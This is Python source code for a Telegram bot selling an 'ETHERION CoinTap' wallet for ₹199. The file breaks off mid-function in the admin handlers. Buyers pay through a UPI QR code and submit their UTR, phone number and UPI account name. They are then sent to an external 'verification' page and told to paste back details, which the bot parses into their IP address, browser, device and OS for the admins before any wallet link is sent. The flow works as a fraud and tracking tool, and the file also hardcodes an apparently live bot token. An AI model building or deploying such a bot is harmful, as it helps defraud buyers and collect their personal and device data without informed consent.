#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════╗
║   ETHERION CoinTap  —  Premium Sales + Admin Panel Telegram Bot       ║
║   ------------------------------------------------------------------  ║
║   • Single file  • SQLite storage (data restart ke baad bhi safe)     ║
║   • Termux + GSM + Render Hosting ready (pure python, no gcc)         ║
║   • Roles : BOSS (owner) > MANAGER > USER                             ║
║   • Flow  : BUY NOW -> QR (GitHub hosted) -> PAYMENT DONE ->          ║
║             UTR / Phone / UPI Name -> Admin Verification ->           ║
║             Verification URL -> Device Info report -> Wallet Link     ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import html
import inspect
import logging
import os
import re
import sqlite3
import sys
import threading
import time
import traceback
from datetime import datetime
from html import escape as E
from http.server import BaseHTTPRequestHandler, HTTPServer

from telegram import (BotCommand, CallbackQuery, InlineKeyboardButton,
                      InlineKeyboardMarkup, InputFile, Update)
from telegram.constants import ChatAction, ParseMode
from telegram.error import BadRequest, Forbidden, TelegramError, TimedOut
from telegram.ext import (Application, CallbackQueryHandler, CommandHandler,
                          ContextTypes, MessageHandler, filters)
from telegram.request import HTTPXRequest

LOG = logging.getLogger("ETHERION")

# ══════════════════════════════════════════════════════════════════════
#  1.  CONFIG  (sirf yahi section badalna hai)
# ══════════════════════════════════════════════════════════════════════
BOT_TOKEN      = "8846166917:AAEYjmKwsyvVlU5qNRPPP7S3R_2v1AGItDg"   # ⚠️ BotFather se revoke karke naya daalo
BOSS_CHAT_ID   = 8622441299          # 👑 BOSS = Real God
SEED_MANAGERS  = [8588800508]        # 🧢 Initial Manager(s)

BRAND          = "ETHERION CoinTap"
SALE_MESSAGE   = ("The Etherean wallet is currently available at a lower price "
                  "during the sale.\n<b>ONLY 199. INDIAN RUPEES</b>")
VERIFY_URL     = "https://papaya-sherbet-7b3e4d.netlify.app"
VERIFY_TEXT    = "Please share whatever details emerge here, for the purpose of verification."

# ---- QR image (GitHub par hosted) ----
GITHUB_REPO    = "s6231828-lgtm/ETHERIONCoinTap"     
QR_FILENAME    = "IMG_20261007_065843.jpg"           
QR_BRANCHES    = ["main", "master", "HEAD"]
QR_LOCAL_NAMES = ["IMG_20261007_065843.jpg", "qr.jpg", "qr.jpeg", "qr.png", "QR.jpg", "QR.PNG"]
QR_EXTRA_URL   = ""     

# ---- Validity rules ----
UTR_MIN, UTR_MAX   = 12, 22      
PHONE_DIGITS       = 10          
UPI_NAME_MIN       = 3
MAX_RESUBMIT_WARN  = 3           

DB_FILE   = "etherion_cointap.db"
LOG_FILE  = "etherion_cointap.log"
PAGE_SIZE = 8

ROLE_BOSS, ROLE_MANAGER, ROLE_USER = "boss", "manager", "user"

# ══════════════════════════════════════════════════════════════════════
#  2.  DATABASE LAYER  (thread-safe SQLite)
# ══════════════════════════════════════════════════════════════════════
_LOCK = threading.RLock()
_CONN: sqlite3.Connection | None = None

def _conn() -> sqlite3.Connection:
    global _CONN
    if _CONN is None:
        _CONN = sqlite3.connect(DB_FILE, check_same_thread=False, timeout=30.0)
        _CONN.row_factory = sqlite3.Row
        _CONN.execute("PRAGMA journal_mode=WAL;")
        _CONN.execute("PRAGMA synchronous=NORMAL;")
    return _CONN

def sql_fetch(query: str, args: tuple = ()) -> list[dict]:
    with _LOCK:
        cur = _conn().execute(query, args)
        return [dict(r) for r in cur.fetchall()]

def sql_one(query: str, args: tuple = ()) -> dict | None:
    rows = sql_fetch(query, args)
    return rows[0] if rows else None

def sql_run(query: str, args: tuple = ()) -> int:
    with _LOCK:
        cur = _conn().execute(query, args)
        _conn().commit()
        return cur.lastrowid

SCHEMA = """
CREATE TABLE IF NOT EXISTS users(
    chat_id      INTEGER PRIMARY KEY,
    username     TEXT,
    fullname     TEXT,
    role         TEXT    DEFAULT 'user',
    blocked      INTEGER DEFAULT 0,
    approved     INTEGER DEFAULT 0,
    pay_status   TEXT    DEFAULT 'none',
    awaiting     TEXT,
    target_chat  INTEGER DEFAULT 0,
    utr          TEXT,
    phone        TEXT,
    upi_name     TEXT,
    submits      INTEGER DEFAULT 0,
    device_done  INTEGER DEFAULT 0,
    created      TEXT,
    updated      TEXT
);
CREATE TABLE IF NOT EXISTS payments(
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    chat_id     INTEGER, username TEXT, fullname TEXT,
    utr TEXT, phone TEXT, upi_name TEXT,
    status      TEXT DEFAULT 'pending',
    created     TEXT, acted_at TEXT, acted_by INTEGER, acted_role TEXT, note TEXT
);
CREATE TABLE IF NOT EXISTS devices(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    chat_id INTEGER, username TEXT, fullname TEXT,
    ip TEXT, browser TEXT, device TEXT, os TEXT, raw TEXT, created TEXT
);
CREATE TABLE IF NOT EXISTS logs(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ts TEXT, actor INTEGER, actor_role TEXT, action TEXT, target INTEGER, note TEXT
);
CREATE TABLE IF NOT EXISTS kv(k TEXT PRIMARY KEY, v TEXT);
"""

def db_init():
    with _LOCK:
        _conn().executescript(SCHEMA)
        _conn().commit()

def setting(key: str, default: str = "") -> str:
    row = sql_one("SELECT v FROM kv WHERE k=?", (key,))
    return row["v"] if row and row["v"] is not None else default

def set_setting(key: str, value: str):
    sql_run("INSERT INTO kv(k,v) VALUES(?,?) ON CONFLICT(k) DO UPDATE SET v=excluded.v", (key, value))

def now() -> str:
    return datetime.now().strftime("%d-%m-%Y %H:%M:%S")

def get_user(chat_id: int) -> dict | None:
    return sql_one("SELECT * FROM users WHERE chat_id=?", (int(chat_id),))

def user_touch(chat_id: int, username=None, fullname=None) -> dict:
    u = get_user(chat_id)
    if not u:
        sql_run("INSERT INTO users(chat_id,username,fullname,role,created,updated) VALUES(?,?,?,?,?,?)",
                (chat_id, username, fullname, ROLE_USER, now(), now()))
        u = get_user(chat_id)
    else:
        ch, args = [], []
        if username is not None and username != u["username"]:
            ch.append("username=?"); args.append(username)
        if fullname is not None and fullname != u["fullname"]:
            ch.append("fullname=?"); args.append(fullname)
        if ch:
            ch.append("updated=?"); args.append(now())
            sql_run(f"UPDATE users SET {','.join(ch)} WHERE chat_id=?", tuple(args + [chat_id]))
        u = get_user(chat_id)
    if chat_id == BOSS_CHAT_ID and u["role"] != ROLE_BOSS:
        u_set(chat_id, role=ROLE_BOSS, blocked=0); u = get_user(chat_id)
    return u

def u_set(chat_id: int, **fields):
    if not fields:
        return
    fields["updated"] = now()
    cols = ",".join(f"{k}=?" for k in fields)
    sql_run(f"UPDATE users SET {cols} WHERE chat_id=?", tuple(list(fields.values()) + [int(chat_id)]))

def role_of(u: dict) -> str:
    if u["chat_id"] == BOSS_CHAT_ID:
        return ROLE_BOSS
    return u["role"] or ROLE_USER

def is_admin(u: dict) -> bool:
    return role_of(u) in (ROLE_BOSS, ROLE_MANAGER)

def manager_ids() -> list[int]:
    return [r["chat_id"] for r in sql_fetch("SELECT chat_id FROM users WHERE role='manager'")]

def add_log(actor: int, actor_role: str, action: str, target: int = 0, note: str = ""):
    sql_run("INSERT INTO logs(ts,actor,actor_role,action,target,note) VALUES(?,?,?,?,?,?)",
            (now(), actor, actor_role, action, target, note))

def count(table: str, where: str = "", args: tuple = ()) -> int:
    return sql_one(f"SELECT COUNT(*) c FROM {table} {where}", args)["c"]

# ══════════════════════════════════════════════════════════════════════
#  3.  VALIDATION
# ══════════════════════════════════════════════════════════════════════
DIGITS = re.compile(r"\d+")

def only_digits(s: str) -> str:
    return "".join(DIGITS.findall(s or ""))

def check_utr(raw: str):
    s = only_digits(raw)
    if not s or not (UTR_MIN <= len(s) <= UTR_MAX):
        return None, f"❌ <b>Invalid UTR!</b>\nPlease provide a valid numeric UTR ({UTR_MIN} to {UTR_MAX} digits).\nOr type <code>/cancel</code>."
    return s, None

def check_phone(raw: str):
    s = only_digits(raw)
    if len(s) > 12 and s.startswith(("91", "0")): s = s[-10:]
    if not re.fullmatch(r"[6-9]\d{9}", s):
        return None, "❌ <b>Invalid Phone Number!</b>\nPlease provide a valid 10-digit mobile number."
    return s, None

def check_upi_name(raw: str):
    s = " ".join((raw or "").split())
    if len(s) < UPI_NAME_MIN or len(s) > 60 or not re.fullmatch(r"[A-Za-z\u0900-\u097F][A-Za-z\u0900-\u097F .'\-]*", s):
        return None, "❌ <b>Invalid Name!</b> Please provide a valid account name (only letters)."
    return s, None

IP_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")

def parse_device_report(text: str) -> dict:
    out = {"ip": "N/A", "browser": "N/A", "device": "N/A", "os": "N/A"}
    for line in (text or "").splitlines():
        if ":" not in line: continue
        k, v = line.split(":", 1)
        k, v = k.strip().lower().replace("_", " ").replace("-", " "), v.strip().strip("*` ")
        if not v or set(v) <= {"-", "="}: continue
        if k in ("ip address", "ip", "ip addr", "public ip", "address"): out["ip"] = v
        elif "browser" in k: out["browser"] = v
        elif any(t in k for t in ("device", "model", "phone name", "mobile name")): out["device"] = v
        elif any(t in k for t in ("platform", "os", "operating", "system", "android", "version")): out["os"] = v
    if out["ip"] == "N/A":
        if m := IP_RE.search(text or ""): out["ip"] = m.group(0)
    return out

def looks_like_device_report(text: str) -> bool:
    t = (text or "").lower()
    return sum(1 for k in ("ip address", "browser", "device name", "platform", "os:", "android") if k in t) >= 1 or bool(IP_RE.search(text or ""))

# ══════════════════════════════════════════════════════════════════════
#  4.  QR IMAGE LOADER
# ══════════════════════════════════════════════════════════════════════
_QR_CACHE: bytes | None = None
_QR_SOURCE = "none"

def qr_candidate_urls() -> list[str]:
    urls = [QR_EXTRA_URL.strip()] if QR_EXTRA_URL else []
    for br in QR_BRANCHES:
        urls.append(f"https://raw.githubusercontent.com/{GITHUB_REPO}/{br}/{QR_FILENAME}")
    return urls

def fetch_qr_bytes() -> bytes | None:
    global _QR_CACHE, _QR_SOURCE
    if _QR_CACHE: return _QR_CACHE
    import urllib.request
    for url in qr_candidate_urls():
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "ETHERION-CoinTap/1.0"})
            with urllib.request.urlopen(req, timeout=15) as r:
                data = r.read()
            if len(data) > 200 and data[:4] not in (b"<!DO", b"<htm", b"404:", b"Not "):
                _QR_CACHE, _QR_SOURCE = data, url
                return _QR_CACHE
        except Exception:
            pass
    return None

async def send_qr(chat_id, context, caption: str, kb, is_update=False):
    bot = context.bot
    data = await asyncio.to_thread(fetch_qr_bytes)
    if data:
        try:
            await bot.send_photo(chat_id=chat_id, photo=InputFile(__import__("io").BytesIO(data), filename=QR_FILENAME),
                                 caption=caption, parse_mode=ParseMode.HTML, reply_markup=kb)
            return True
        except Exception:
            pass
    sender = context.bot.send_message
    await sender(chat_id, "⚠️ <b>Failed to load QR image.</b>\nPlease contact admin.")
    return False

# ══════════════════════════════════════════════════════════════════════
#  5.  KEYBOARDS
# ══════════════════════════════════════════════════════════════════════
def kb_user_buy():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🛒  BUY NOW  •  ₹199", callback_data="buy")]])

def kb_after_qr():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅  PAYMENT DONE", callback_data="pdone")],
        [InlineKeyboardButton("🔁  Get QR Again", callback_data="buy"),
         InlineKeyboardButton("✖️  Cancel", callback_data="cancel")],
    ])

def kb_review():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅  SUBMIT  (Confirm)", callback_data="confirm")],
        [InlineKeyboardButton("✏️  Edit Details", callback_data="edit")],
    ])

def kb_admin_pay(cid: int, status_line: str = ""):
    rows = [
        [InlineKeyboardButton("✅ VERIFY", callback_data=f"ac|ok|{cid}"),
         InlineKeyboardButton("❌ REJECT", callback_data=f"ac|no|{cid}")],
        [InlineKeyboardButton("🚫 BLOCK USER", callback_data=f"ac|bk|{cid}")]
    ]
    if status_line:
        rows.insert(0, [InlineKeyboardButton(status_line, callback_data="noop")])
    return InlineKeyboardMarkup(rows)

def kb_admin_device(cid: int):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔗 SEND WALLET LINK", callback_data=f"ac|url|{cid}")]
    ])

def kb_page(kind: str, off: int, has_prev: bool, has_next: bool):
    row = []
    if has_prev: row.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"pg|{kind}|{max(0, off - PAGE_SIZE)}"))
    if has_next: row.append(InlineKeyboardButton("Next ➡️", callback_data=f"pg|{kind}|{off + PAGE_SIZE}"))
    return InlineKeyboardMarkup([row]) if row else None

# ══════════════════════════════════════════════════════════════════════
#  6.  TEXT TEMPLATES
# ══════════════════════════════════════════════════════════════════════
LINE = "━━━━━━━━━━━━━━━━━━━━━━"

def t_welcome_user():
    return (f"🔱✨ <b>WELCOME TO {E(BRAND)}</b> ✨🔱\n{LINE}\n\n"
            f"{setting('sale', SALE_MESSAGE)}\n\n"
            f"{LINE}\n👇 Click <b>BUY NOW</b>, scan the QR and make your payment.")

def t_admin_dashboard(pending, verified, blocked, devices, users, role):
    rej_count = count('payments', "WHERE status='rejected'")
    txt = (
        "👑 <b>ADMIN DASHBOARD</b>\n" if role == ROLE_BOSS else "🧢 <b>MANAGER DASHBOARD</b>\n"
    )
    txt += (
        f"{LINE}\n"
        f"⏳ Pending: <b>{pending}</b>  |  📡 Devices: <b>{devices}</b>\n"
        f"✅ Verified: {verified}  |  ❌ Rejected: {rej_count}\n"
        f"👥 Total Users: {users}  |  🚫 Blocked: {blocked}\n"
        f"{LINE}\n"
        f"⚡ <b>Action Commands (Hold to copy to chat box)</b>\n"
        f"/123456ok → Approve payment\n"
        f"/123456no → Reject payment\n"
        f"/123456bk → Block user\n"
        f"/123456ub → Unblock user\n"
        f"/123456url https://link → Send WALLET link\n"
    )
    if role == ROLE_BOSS:
        txt += (
            f"\n👑 <b>Boss Commands</b>\n"
            f"/addmanager 123456 → Add new manager\n"
            f"/delmanager 123456 → Remove manager\n"
            f"/managers → List all managers\n"
        )
    txt += (
        f"\n🧰 <b>List Commands</b>\n"
        f"/pending → View pending payments\n"
        f"/devices → View device reports\n"
        f"/verified → View verified users\n"
        f"/users → View all users\n"
        f"/stats → View statistics\n"
    )
    return txt

def t_blocked():
    return ("🚫 <b>You have been BLOCKED.</b>\n"
            "No further requests will be processed. Contact support if this is an error.")

def payment_report_html(u: dict, p: dict, flag: bool = False) -> str:
    return (
        "💰 <b>NEW PAYMENT REQUEST</b>\n"
        f"{LINE}\n"
        f"🆔 <b>Chat ID :</b> <code>{u['chat_id']}</code>\n"
        f"👤 Naam      : {E(u['fullname'] or '—')}\n"
        f"🷓 Username  : @{E(u['username']) if u['username'] else '—'}\n"
        f"{LINE}\n"
        f"🧾 UTR Number      : <code>{E(p['utr'])}</code>\n"
        f"📱 Phone Number    : <code>{E(p['phone'])}</code>\n"
        f"🏦 UPI Account Name: {E(p['upi_name'])}\n"
        f"💵 Amount          : ₹{E(setting('price', '199'))}\n"
        f"🕒 Submit Time     : {E(p['created'])}\n"
        f"🔁 Total Requests  : {u['submits']}\n"
        + (f"⚠️ <b>FLAG: Baar-baar request bhej raha hai ({u['submits']}x) — check karke BLOCK karein.</b>\n" if flag else "")
        + f"{LINE}\n"
        f"👇 Niche diye buttons ka use karein:"
    )

def device_report_html(u: dict, d: dict) -> str:
    return (
        "📡 <b>DEVICE VERIFICATION REPORT</b>\n"
        f"{LINE}\n"
        f"🆔 <b>Chat ID :</b> <code>{u['chat_id']}</code>\n"
        f"👤 Naam     : {E(u['fullname'] or '—')}  (@{E(u['username']) if u['username'] else '—'})\n"
        f"{LINE}\n"
        f"🌐 IP Address   : <code>{E(d['ip'])}</code>\n"
        f"🧭 Browser      : {E(d['browser'])}\n"
        f"📱 Device Name  : {E(d['device'])}\n"
        f"🤖 Platform / OS: {E(d['os'])}\n"
        f"🕒 Time         : {E(d['created'])}\n"
        f"{LINE}\n"
        f"➡️ Click below to send Wallet Link:"
    )

HELP_USER = (
    f"📘 <b>{E(BRAND)} — Help</b>\n"
    "/start — Main menu + BUY NOW\n"
    "/status — Check your payment status\n"
    "/cancel — Cancel current form\n"
    "/qr — Get payment QR again\n"
    f"{LINE}\n"
    "1️⃣ BUY NOW → Scan QR → Pay ₹199\n"
    "2️⃣ PAYMENT DONE → Enter UTR, Phone, UPI Name\n"
    "3️⃣ Wait for Admin verification\n"
    "4️⃣ Submit device details on the given link\n"
    "5️⃣ Get the Wallet Access link once approved!"
)

# ══════════════════════════════════════════════════════════════════════
#  7.  LOW LEVEL SENDING HELPERS
# ══════════════════════════════════════════════════════════════════════
async def safe_edit(q: CallbackQuery, text=None, kb=None, parse_mode=ParseMode.HTML):
    try:
        if text is None:
            await q.edit_message_reply_markup(reply_markup=kb)
        else:
            await q.edit_message_text(text, reply_markup=kb, parse_mode=parse_mode)
    except BadRequest:
        pass
    except Exception:
        pass

async def ans(q: CallbackQuery, text="", alert=False):
    try:
        await q.answer(text, show_alert=alert)
    except Exception:
        pass

async def send_to(bot, chat_id: int, text, kb=None, html_mode=True, silent=False):
    try:
        if html_mode:
            return await bot.send_message(chat_id, text, parse_mode=ParseMode.HTML, reply_markup=kb, disable_notification=silent)
        return await bot.send_message(chat_id, text, reply_markup=kb, disable_notification=silent)
    except Forbidden:
        pass
    except Exception:
        pass
    return None

async def notify_admins(bot, text, kb=None, to_manager=True, to_boss=True):
    targets = []
    if to_boss: targets.append(BOSS_CHAT_ID)
    if to_manager: targets += [m for m in manager_ids() if m != BOSS_CHAT_ID]
    for t in dict.fromkeys(targets):
        await send_to(bot, t, text, kb)

# ══════════════════════════════════════════════════════════════════════
#  8.  CORE ACTIONS
# ══════════════════════════════════════════════════════════════════════
async def act_verify(context, actor: dict, target_id: int, src="cmd"):
    tu = get_user(target_id)
    if not tu: return f"❌ User <code>{target_id}</code> register nahi hai."
    if tu["blocked"]: return f"🚫 User <code>{target_id}</code> BLOCKED hai."
    
    last = sql_one("SELECT * FROM payments WHERE chat_id=? ORDER BY id DESC LIMIT 1", (target_id,))
    if last:
        sql_run("UPDATE payments SET status='verified', acted_at=?, acted_by=?, acted_role=?, note=? WHERE id=?",
                (now(), actor["chat_id"], role_of(actor), f"verified_via_{src}", last["id"]))
    u_set(target_id, pay_status="verified", approved=1, awaiting="device", device_done=0)
    add_log(actor["chat_id"], role_of(actor), "VERIFY", target_id, src)

    url = setting("vurl", VERIFY_URL)
    price = setting("price", "199")
    await send_to(context.bot, target_id,
                  f"🎉 <b>PAYMENT SUCCESSFUL !</b>\n{LINE}\n"
                  f"✅ Your ₹{E(price)} payment has been verified.\n"
                  f"<b>Please complete the final verification step:</b>\n{E(url)}\n{LINE}\n"
                  f"📌 <b>{E(setting('vtext', VERIFY_TEXT))}</b>\n\n"
                  f"👆 After opening the link, <b>paste the exact details shown there</b> right here. "
                  f"Then admin will send your final Wallet Link.")
    return f"✅ <b>VERIFIED</b> → user <code>{target_id}</code> ko device URL bhej diya gaya."

async def act_reject(context, actor: dict, target_id: int, src="cmd"):
    tu = get_user(target_id)
    if not tu: return f"❌ User <code>{target_id}</code> register nahi hai."
    last = sql_one("SELECT * FROM payments WHERE chat_id=? ORDER BY id DESC LIMIT 1", (target_id,))
    if last:
        sql_run("UPDATE payments SET status='rejected', acted_at=?, acted_by=?, acted_role=? WHERE id=?",
                (now(), actor["chat_id"], role_of(actor), last["id"]))
    u_set(target_id, pay_status="rejected", approved=0, awaiting=None)
    add_log(actor["chat_id"], role_of(actor), "REJECT", target_id, src)
    await send_to(context.bot, target_id,
                  f"❌ <b>PAYMENT REJECTED</b>\n{LINE}\n"
                  f"Your UTR <code>{E(tu['utr'] or '—')}</code> did not match or details were incorrect.\n"
                  f"Send <b>/start</b> to submit a new request with correct details.")
    return f"❌ <b>REJECTED</b> user <code>{target_id}</code>"

async def act_block(context, actor: dict, target_id: int, src="cmd"):
    tu = get_user(target_id)
    if not tu: return f"❌ User register nahi hai."
    if target_id == BOSS_CHAT_ID or tu["role"] == ROLE_BOSS: return "🛑 Boss ko block nahi kiya ja sakta."
    u_set(target_id, blocked=1, awaiting=None)
    add_log(actor["chat_id"], role_of(actor), "BLOCK", target_id, src)
    await send_to(context.bot, target_id, "🚫 You have been BLOCKED.")
    return f"🚫 <b>BLOCKED</b> user <code>{target_id}</code>"

async def act_unblock(context, actor: dict, target_id: int, src="cmd"):
    tu = get_user(target_id)
    if not tu: return f"❌ User register nahi hai."
    u_set(target_id, blocked=0)
    add_log(actor["chat_id"], role_of(actor), "UNBLOCK", target_id, src)
    await send_to(context.bot, target_id, "🟢 You have been unblocked. Send /start to begin.")
    return f"🟢 <b>UNBLOCKED</b> user <code>{target_id}</code>"

async def act_send_url(context, actor: dict, target_id: int, url: str, src="cmd"):
    tu = get_user(target_id)
    if not tu: return f"❌ User register nahi hai."
    if not re.match(r"^https?://", url.strip(), re.I): return "❌ Link http:// ya https:// se shuru hona chahiye."
    if tu["blocked"]: return f"🚫 User blocked hai."
    add_log(actor["chat_id"], role_of(actor), "SEND_URL", target_id, url[:120])
    
    m = await send_to(context.bot, target_id,
                      f"🎉 <b>ETHERION CoinTap WALLET</b>\n{LINE}\n"
                      f"Here is your final wallet access link:\n\n🔗 {E(url.strip())}\n{LINE}\n"
                      f"Enjoy your premium access!")
    if not m: return "⚠️ User ne bot ko block kar rakha hai, URL deliver nahi hua."
    u_set(target_id, awaiting="None", approved=1)
    return f"📩 ETHERION Wallet Link sent to <code>{target_id}</code>"

async def do_action(context, actor: dict, action: str, target_id: int, src="cmd", extra=""):
    r = role_of(actor)
    if r not in (ROLE_BOSS, ROLE_MANAGER): return "⛔ Ye command sirf ADMIN ke liye hai."
    if action == "ok": return await act_verify(context, actor, target_id, src)
    if action == "no": return await act_reject(context, actor, target_id, src)
    if action == "bk": return await act_block(context, actor, target_id, src)
    if action == "ub": return await act_unblock(context, actor, target_id, src)
    if action == "url":
        if not extra: return f"✍️ Format: /{target_id}url https://..."
        return await act_send_url(context, actor, target_id, extra, src)
    return "❌ Unknown action."

# ══════════════════════════════════════════════════════════════════════
#  9.  LIST RENDERER (pagination)
# ══════════════════════════════════════════════════════════════════════
def render_list(kind: str, off: int):
    if kind == "devices":
        total = count("devices")
        rows = sql_fetch(f"SELECT * FROM devices ORDER BY id DESC LIMIT {PAGE_SIZE} OFFSET {off}")
        if not rows: return "📡 <b>DEVICE REPORTS</b>\nAbhi koi device report nahi aayi.", None, False
        out = [f"📡 <b>DEVICE REPORTS</b>  ({total})\n{LINE}"]
        kbs = []
        for d in rows:
            u = get_user(d["chat_id"]) or {"chat_id": d["chat_id"], "fullname": d["fullname"], "username": d["username"]}
            out.append(device_report_html(u, d))
            kbs.append(kb_admin_device(d["chat_id"]))
        return out, kbs, True
    
    if kind == "users":
        total = count("users", "WHERE role='user'")
        rows = sql_fetch(f"SELECT * FROM users WHERE role='user' ORDER BY updated DESC LIMIT {PAGE_SIZE} OFFSET {off}")
        if not rows: return "👥 <b>ALL USERS</b>\nKoi user nahi.", None, False
        out = [f"👥 <b>ALL USERS</b>  ({total})\n{LINE}"]
        for u in rows:
            out.append(f"<code>{u['chat_id']}</code> — {E(u['fullname'] or '—')}\n💳 {u['pay_status']} | 🚫 {'BLOCKED' if u['blocked'] else 'active'}")
        return out, [None]*len(out), True
        
    total = count("payments", "WHERE status=?", (kind,))
    rows = sql_fetch(f"SELECT * FROM payments WHERE status=? ORDER BY id DESC LIMIT {PAGE_SIZE} OFFSET {off}", (kind,))
    title = {"pending": "⏳ PENDING PAYMENTS", "verified": "✅ VERIFIED", "rejected": "❌ REJECTED"}[kind]
    if not rows: return f"{title}\nAbhi koi record nahi hai.", None, False
    out = [f"<b>{title}</b>  (total {total})\n{LINE}"]
    kbs = []
    for p in rows:
        u = get_user(p["chat_id"]) or {"submits": 0}
        body = (f"🆔 <code>{p['chat_id']}</code> — {E(p['fullname'] or '—')}\n"
                f"🧾 UTR <code>{E(p['utr'])}</code> | 📱 {E(p['phone'])}\n🕒 {E(p['created'])} | 🔁 {u['submits']}x")
        out.append(body)
        kbs.append(kb_admin_pay(p["chat_id"], "⏳ PENDING" if kind == "pending" else ""))
    return out, kbs, True

# ══════════════════════════════════════════════════════════════════════
# 10.  HANDLERS — USER SIDE
# ══════════════════════════════════════════════════════════════════════
def priv(update: Update) -> bool:
    return bool(update.effective_chat and update.effective_chat.type == "private")

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not priv(update): return
    u = user_touch(update.effective_chat.id, getattr(update.effective_user, "username", None),
                   " ".join(filter(None, [update.effective_user.first_name, update.effective_user.last_name])))
    msg = update.effective_message
    if u["blocked"]: return await msg.reply_html(t_blocked())
    
    r = role_of(u)
    if r in (ROLE_BOSS, ROLE_MANAGER):
        txt = t_admin_dashboard(count("payments", "WHERE status='pending'"),
                                count("payments", "WHERE status='verified'"),
                                count("users", "WHERE blocked=1"),
                                count("devices"), count("users", "WHERE role='user'"), r)
        return await msg.reply_html(txt)

    if u["pay_status"] == "pending":
        return await msg.reply_html(f"⏳ <b>Your request is currently pending.</b>\nUTR <code>{E(u['utr'])}</code> — Under admin review.")
    if u["pay_status"] == "verified":
        return await msg.reply_html(f"✅ You are verified!\n🔗 {E(setting('vurl', VERIFY_URL))}\n📌 {E(setting('vtext', VERIFY_TEXT))}")
        
    u_set(u["chat_id"], awaiting=None)
    await msg.reply_html(t_welcome_user(), reply_markup=kb_user_buy())

async def cb_buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await ans(q)
    u = user_touch(q.from_user.id, q.from_user.username, q.from_user.first_name)
    if u["blocked"]: return await q.message.reply_text(t_blocked())
    if u["pay_status"] == "pending": return await q.answer("⏳ Your request is pending.", show_alert=True)
    if u["pay_status"] == "verified": return await q.answer("✅ You are already verified!", show_alert=True)
    
    await safe_edit(q, f"📸 <b>Payment QR is sent below 👇</b>\n💵 Amount: <b>₹{E(setting('price', '199'))}</b>\n1️⃣ Scan QR → Make payment\n2️⃣ Click <b>PAYMENT DONE</b>")
    await send_qr(q.message.chat_id, context, f"🔱 <b>{E(BRAND)} — PAYMENT QR</b>\n{LINE}\n💰 Scan to pay <b>₹{E(setting('price', '199'))}</b>.\n✅ Click <b>PAYMENT DONE</b> once paid.", kb_after_qr())

async def cb_pdone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await ans(q, "Asking for UTR…")
    u = user_touch(q.from_user.id, q.from_user.username, q.from_user.first_name)
    if u["blocked"] or u["pay_status"] == "pending": return
    u_set(u["chat_id"], awaiting="utr", utr=None, phone=None, upi_name=None)
    await q.message.reply_html(f"📝 <b>STEP 1 / 3 — PAYMENT UTR NUMBER</b>\n{LINE}\nProvide the <b>UTR / UFIN / Reference No.</b> of your payment.\n✅ Only numbers ({UTR_MIN}–{UTR_MAX} digits).")

async def cb_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await ans(q, "Cancelled ✅")
    u_set(q.from_user.id, awaiting=None)
    await safe_edit(q, "✖️ Cancelled. Send /start to begin again.")

async def cb_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await ans(q, "Submitting…")
    u = user_touch(q.from_user.id, q.from_user.username, q.from_user.first_name)
    if u["blocked"]: return
    if not (u["utr"] and u["phone"] and u["upi_name"]):
        u_set(u["chat_id"], awaiting="utr")
        return await q.message.reply_text("❌ Fill all details first. Start with UTR.")
    
    pid = sql_run("INSERT INTO payments(chat_id,username,fullname,utr,phone,upi_name,status,created) VALUES(?,?,?,?,?,?,?,?)",
                  (u["chat_id"], u["username"], u["fullname"], u["utr"], u["phone"], u["upi_name"], "pending", now()))
    submits = (u["submits"] or 0) + 1
    u_set(u["chat_id"], pay_status="pending", awaiting=None, submits=submits)
    
    p = sql_one("SELECT * FROM payments WHERE id=?", (pid,))
    report = payment_report_html({**u, "submits": submits}, p, submits >= MAX_RESUBMIT_WARN)
    await notify_admins(context.bot, report, kb_admin_pay(u["chat_id"], "⏳ NEW REQUEST"))
    await safe_edit(q, f"✅ <b>REQUEST SUBMITTED !</b>\n{LINE}\n🧾 UTR <code>{E(u['utr'])}</code>\n⏳ Please wait for admin verification. Use /status to check updates.")

async def cb_edit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await ans(q)
    u_set(q.from_user.id, awaiting="utr")
    await q.message.reply_html("✏️ <b>Edit Details</b> — Please send your <b>UTR number</b> again.")

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = user_touch(update.effective_chat.id, update.effective_user.username, update.effective_user.first_name)
    if u["blocked"]: return await update.effective_message.reply_html(t_blocked())
    st = {"none": "⚪ No request submitted", "pending": "⏳ Verification Pending", "verified": "✅ VERIFIED", "rejected": "❌ REJECTED"}[u["pay_status"]]
    await update.effective_message.reply_html(f"📊 <b>YOUR STATUS</b>\n{LINE}\n🆔 Chat ID: <code>{u['chat_id']}</code>\n💳 {st}\n🧾 UTR: <code>{E(u['utr'] or '—')}</code>")

async def cmd_qr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_qr(update.effective_chat.id, context, f"🔱 <b>{E(BRAND)} — PAYMENT QR</b>\n💰 ₹{E(setting('price','199'))}", kb_after_qr(), is_update=False)

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.effective_message.reply_html(HELP_USER)

async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u_set(update.effective_chat.id, awaiting=None)
    await update.effective_message.reply_html("✖️ Cancelled. Send /start to begin again.")

# ══════════════════════════════════════════════════════════════════════
# 11.  HANDLERS — ADMIN
# ══════════════════════════════════════════════════════════════════════
def _need_admin(update, context):
    u = user_touch(update.effective_chat.id, update.effective_user.username, update.effective_user.first_name)
    if not is_admin(u):
